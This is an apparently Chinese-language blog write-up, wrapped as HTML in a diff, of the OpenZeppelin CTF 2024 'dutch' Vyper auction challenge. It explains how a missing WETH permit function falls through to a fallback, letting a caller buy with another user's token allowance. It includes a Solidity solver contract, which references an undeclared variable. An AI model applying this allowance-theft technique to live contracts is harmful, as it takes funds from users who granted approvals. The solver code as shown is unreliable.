@@ -1,0 +1,329 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="本文章为 openzeppelin-ctf-2024 系列，记录 dutch 题目的思路与解答 用到的工具 docker foundry make vscode pip vyper  本地搭建 challenge从 github 拉取 ctf-2024 项目，按照 README 文件使用 docker 启动，启动前需要把 images 里的 challenge 删掉，避免启动到别的项目 由于题目使">
+<meta property="og:type" content="article">
+<meta property="og:title" content="openzeppelin-ctf-2024-dutch">
+<meta property="og:url" content="https://caronedot.github.io/2024/03/24/ctf-2024/openzeppelin-ctf-2024-dutch/index.html">
+<meta property="og:site_name" content="little pamphlet">
+<meta property="og:description" content="本文章为 openzeppelin-ctf-2024 系列，记录 dutch 题目的思路与解答 用到的工具 docker foundry make vscode pip vyper  本地搭建 challenge从 github 拉取 ctf-2024 项目，按照 README 文件使用 docker 启动，启动前需要把 images 里的 challenge 删掉，避免启动到别的项目 由于题目使">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2024-03-24T06:20:23.000Z">
+<meta property="article:modified_time" content="2024-08-12T05:20:32.197Z">
+<meta property="article:author" content="caronedot">
+<meta name="twitter:card" content="summary">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>openzeppelin-ctf-2024-dutch</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.1.1"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/categories/">Categores</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2024/04/01/ctf-2024/openzeppelin-ctf-2024-alienspaceship/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2024/03/23/ctf-2024/openzeppelin-ctf-2024-wombocombo/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://caronedot.github.io/2024/03/24/ctf-2024/openzeppelin-ctf-2024-dutch/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://caronedot.github.io/2024/03/24/ctf-2024/openzeppelin-ctf-2024-dutch/&text=openzeppelin-ctf-2024-dutch"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://caronedot.github.io/2024/03/24/ctf-2024/openzeppelin-ctf-2024-dutch/&title=openzeppelin-ctf-2024-dutch"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://caronedot.github.io/2024/03/24/ctf-2024/openzeppelin-ctf-2024-dutch/&is_video=false&description=openzeppelin-ctf-2024-dutch"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=openzeppelin-ctf-2024-dutch&body=Check out this article: https://caronedot.github.io/2024/03/24/ctf-2024/openzeppelin-ctf-2024-dutch/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://caronedot.github.io/2024/03/24/ctf-2024/openzeppelin-ctf-2024-dutch/&title=openzeppelin-ctf-2024-dutch"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://caronedot.github.io/2024/03/24/ctf-2024/openzeppelin-ctf-2024-dutch/&title=openzeppelin-ctf-2024-dutch"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://caronedot.github.io/2024/03/24/ctf-2024/openzeppelin-ctf-2024-dutch/&title=openzeppelin-ctf-2024-dutch"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://caronedot.github.io/2024/03/24/ctf-2024/openzeppelin-ctf-2024-dutch/&title=openzeppelin-ctf-2024-dutch"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://caronedot.github.io/2024/03/24/ctf-2024/openzeppelin-ctf-2024-dutch/&name=openzeppelin-ctf-2024-dutch&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://caronedot.github.io/2024/03/24/ctf-2024/openzeppelin-ctf-2024-dutch/&t=openzeppelin-ctf-2024-dutch"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%94%A8%E5%88%B0%E7%9A%84%E5%B7%A5%E5%85%B7"><span class="toc-number">1.</span> <span class="toc-text">用到的工具</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%9C%AC%E5%9C%B0%E6%90%AD%E5%BB%BA-challenge"><span class="toc-number">2.</span> <span class="toc-text">本地搭建 challenge</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E8%A7%A3%E6%9E%90"><span class="toc-number">3.</span> <span class="toc-text">题目解析</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-number">4.</span> <span class="toc-text">漏洞分析</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF"><span class="toc-number">5.</span> <span class="toc-text">解题思路</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%9C%AC%E5%9C%B0%E8%BF%90%E8%A1%8C"><span class="toc-number">6.</span> <span class="toc-text">本地运行</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E6%96%87%E7%8C%AE"><span class="toc-number">7.</span> <span class="toc-text">参考文献</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        openzeppelin-ctf-2024-dutch
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">caronedot</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2024-03-24T06:20:23.000Z" class="dt-published" itemprop="datePublished">2024-03-24</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/CTF/">CTF</a>
+    </div>
+
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <p>本文章为 <em>openzeppelin-ctf-2024</em> 系列，记录 <em>dutch</em> 题目的思路与解答</p>
+<h1 id="用到的工具"><a href="#用到的工具" class="headerlink" title="用到的工具"></a>用到的工具</h1><ul>
+<li>docker</li>
+<li>foundry</li>
+<li>make</li>
+<li>vscode</li>
+<li>pip</li>
+<li>vyper</li>
+</ul>
+<h1 id="本地搭建-challenge"><a href="#本地搭建-challenge" class="headerlink" title="本地搭建 challenge"></a>本地搭建 challenge</h1><p>从 github 拉取 <a target="_blank" rel="noopener" href="https://github.com/OpenZeppelin/ctf-2024">ctf-2024</a> 项目，按照 <strong>README</strong> 文件使用 docker 启动，启动前需要把 images 里的 challenge 删掉，避免启动到别的项目</p>
+<p>由于题目使用的是 <code>0.4.0b4</code> 版本的 vyper，而引入的 snekmate 是 <code>0.3.10</code> 版本，所以启动会进行报错，snekmate 升级到 <code>0.4.0b5</code> 版本的 vyper 需要自己手动安装，所以在启动后的 challenge-docker 输入以下命令，再用 nc 进行实例生成</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">//将 snekmate 文件更新为 0.4.0b5 版本</span><br><span class="line">pip install git+https://github.com/pcaversaccio/snekmate.git@modules</span><br><span class="line">//更新 vyper</span><br><span class="line">pip install vyper==0.4.0b5</span><br></pre></td></tr></table></figure>
+
+<h1 id="题目解析"><a href="#题目解析" class="headerlink" title="题目解析"></a>题目解析</h1><p>该题目使用 vyper 语言编写，存在 Auction，拍卖一个价值 1 ether 的 Art ERC721 代币，接受 WETH 代币，可以使用 <em>buyWithPermit</em> 进行购买，同时用户还给授权给 Auction 使用 1 ether 的额度，成功条件是从 Auction 购买 Art 代币</p>
+<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>Auction 提供 <em>buyWithPermit</em> 方法，该方法会调用 WETH 的 <em>permit</em> 进行转账，但是提供的 WETH.vy 并没有 <em>permit</em> 方法，所以会走 fallback 方法不进行任何操作，同时又因为 user 授权给了 Auction 1 ether 的额度，所以我们可以直接声明 buyer 为 user 进行购买</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@external</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">buyWithPermit</span>(<span class="params"></span></span><br><span class="line"><span class="params">    buyer: address,</span></span><br><span class="line"><span class="params">    receiver: address,</span></span><br><span class="line"><span class="params">    amount: uint256,</span></span><br><span class="line"><span class="params">    deadline: uint256,</span></span><br><span class="line"><span class="params">    v: uint8,</span></span><br><span class="line"><span class="params">    r: bytes32,</span></span><br><span class="line"><span class="params">    s: bytes32</span></span><br><span class="line"><span class="params"></span>):</span><br><span class="line">--&gt;    extcall self.token.permit(buyer, self, amount, deadline, v, r, s)</span><br><span class="line">    self.auction(buyer, receiver)</span><br></pre></td></tr></table></figure>
+
+<h1 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h1><p>第一种解法：通过 <em>buyWithPermit</em> 将 buyer 声明为 user 进行购买<br>第二种解法：因为本身生成的账户就有 1000 ether，自己构造 weth 进行购买</p>
+<details>
+<summary>攻击合约</summary>
+
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: UNLICENSED</span></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;forge-ctf/CTFSolver.sol&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123;<span class="title class_">Challenge</span>&#125; <span class="keyword">from</span> <span class="string">&quot;src/Challenge.sol&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> &#123;<span class="title class_">IAuction</span>&#125; <span class="keyword">from</span> <span class="string">&quot;src/interfaces/IAuction.sol&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123;<span class="variable constant_">IWETH</span>&#125; <span class="keyword">from</span> <span class="string">&quot;src/interfaces/IWETH.sol&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123;<span class="title class_">IERC721Extended</span>&#125; <span class="keyword">from</span> <span class="string">&quot;snekmate/test/tokens/interfaces/IERC721Extended.sol&quot;</span>;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">Solve</span> is <span class="title class_">CTFSolver</span> &#123;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">solve</span>(<span class="params"></span></span><br><span class="line"><span class="params">        address challenge_,</span></span><br><span class="line"><span class="params">        address player</span></span><br><span class="line"><span class="params">    </span>) internal virtual override &#123;</span><br><span class="line">        <span class="title class_">Challenge</span> challenge = <span class="title class_">Challenge</span>(challenge_);</span><br><span class="line">        <span class="comment">//自己构造 weth</span></span><br><span class="line">        <span class="comment">// IAuction auction = challenge.auction();</span></span><br><span class="line">        <span class="comment">// IWETH weth = IWETH(auction.token());</span></span><br><span class="line">        <span class="comment">// weth.deposit&#123;value: 1 ether&#125;();</span></span><br><span class="line">        <span class="comment">// weth.approve(address(auction), 1 ether);</span></span><br><span class="line">        <span class="comment">// auction.buyWithPermit(player, player, 1 ether, 0, 0, &quot;0x0&quot;, &quot;0x0&quot;);</span></span><br><span class="line">        <span class="comment">//使用 user</span></span><br><span class="line">        address user = challenge.<span class="title function_">user</span>();</span><br><span class="line">        auction.<span class="title function_">buyWithPermit</span>(user, user, <span class="number">1</span> ether, <span class="number">0</span>, <span class="number">0</span>, <span class="string">&quot;0x0&quot;</span>, <span class="string">&quot;0x0&quot;</span>);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;solve?&quot;</span>, challenge.<span class="title function_">isSolved</span>());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+</details>
+
+<h1 id="本地运行"><a href="#本地运行" class="headerlink" title="本地运行"></a>本地运行</h1><p>以下为 <code>make</code> 文件，减少命令输入</p>
+<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">-include</span> .env</span><br><span class="line"><span class="meta"><span class="keyword">.PHONY</span>: deploy solve c-s is-solve run</span></span><br><span class="line"><span class="section">deploy:; forge script ./script/Deploy.s.sol --rpc-url <span class="variable">$(RPC_URL)</span> --broadcast -vvvv</span></span><br><span class="line"><span class="section">solve:; forge script ./script/Solve.s.sol --rpc-url <span class="variable">$(RPC_URL)</span> --broadcast -vv</span></span><br><span class="line"><span class="section">is-solve:; cast send $&#123;CHALLENGE&#125; &quot;isSolved()&quot; --rpc-url <span class="variable">$(RPC_URL)</span> --private-key <span class="variable">$(PLAYER)</span></span></span><br><span class="line"><span class="section">run:; cast run --rpc-url <span class="variable">$(RPC_URL)</span> $&#123;tx&#125; -q</span></span><br></pre></td></tr></table></figure>
+
+<p>docker 启动后填入对应数据到 <code>.env</code> 文件</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">RPC_URL=&lt;docker 生成的 rpc&gt;</span><br><span class="line">PLAYER=&lt;玩家私钥&gt;</span><br><span class="line">CHALLENGE=&lt;挑战地址&gt;</span><br></pre></td></tr></table></figure>
+
+<p>以下为执行命令</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make solve</span><br></pre></td></tr></table></figure>
+
+<h1 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h1><ul>
+<li>1.<a target="_blank" rel="noopener" href="https://github.com/OpenZeppelin/ctf-2024/tree/main">openzeppelin 官方题解</a></li>
+<li>2.<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/Uvd2jlHnoxAaEcJyCy64TQ">ZAN Team writeup</a></li>
+<li>3.<a target="_blank" rel="noopener" href="https://github.com/ethereum/ethash/issues/131">unable to install pyethash</a></li>
+<li>4.<a target="_blank" rel="noopener" href="https://github.com/pcaversaccio/snekmate/pull/207">snekmate 升级到 0.4</a></li>
+</ul>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/categories/">Categores</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%94%A8%E5%88%B0%E7%9A%84%E5%B7%A5%E5%85%B7"><span class="toc-number">1.</span> <span class="toc-text">用到的工具</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%9C%AC%E5%9C%B0%E6%90%AD%E5%BB%BA-challenge"><span class="toc-number">2.</span> <span class="toc-text">本地搭建 challenge</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E8%A7%A3%E6%9E%90"><span class="toc-number">3.</span> <span class="toc-text">题目解析</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-number">4.</span> <span class="toc-text">漏洞分析</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF"><span class="toc-number">5.</span> <span class="toc-text">解题思路</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%9C%AC%E5%9C%B0%E8%BF%90%E8%A1%8C"><span class="toc-number">6.</span> <span class="toc-text">本地运行</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E6%96%87%E7%8C%AE"><span class="toc-number">7.</span> <span class="toc-text">参考文献</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://caronedot.github.io/2024/03/24/ctf-2024/openzeppelin-ctf-2024-dutch/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://caronedot.github.io/2024/03/24/ctf-2024/openzeppelin-ctf-2024-dutch/&text=openzeppelin-ctf-2024-dutch"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://caronedot.github.io/2024/03/24/ctf-2024/openzeppelin-ctf-2024-dutch/&title=openzeppelin-ctf-2024-dutch"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://caronedot.github.io/2024/03/24/ctf-2024/openzeppelin-ctf-2024-dutch/&is_video=false&description=openzeppelin-ctf-2024-dutch"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=openzeppelin-ctf-2024-dutch&body=Check out this article: https://caronedot.github.io/2024/03/24/ctf-2024/openzeppelin-ctf-2024-dutch/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://caronedot.github.io/2024/03/24/ctf-2024/openzeppelin-ctf-2024-dutch/&title=openzeppelin-ctf-2024-dutch"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://caronedot.github.io/2024/03/24/ctf-2024/openzeppelin-ctf-2024-dutch/&title=openzeppelin-ctf-2024-dutch"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://caronedot.github.io/2024/03/24/ctf-2024/openzeppelin-ctf-2024-dutch/&title=openzeppelin-ctf-2024-dutch"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://caronedot.github.io/2024/03/24/ctf-2024/openzeppelin-ctf-2024-dutch/&title=openzeppelin-ctf-2024-dutch"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://caronedot.github.io/2024/03/24/ctf-2024/openzeppelin-ctf-2024-dutch/&name=openzeppelin-ctf-2024-dutch&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://caronedot.github.io/2024/03/24/ctf-2024/openzeppelin-ctf-2024-dutch/&t=openzeppelin-ctf-2024-dutch"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2024
+    caronedot
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/categories/">Categores</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
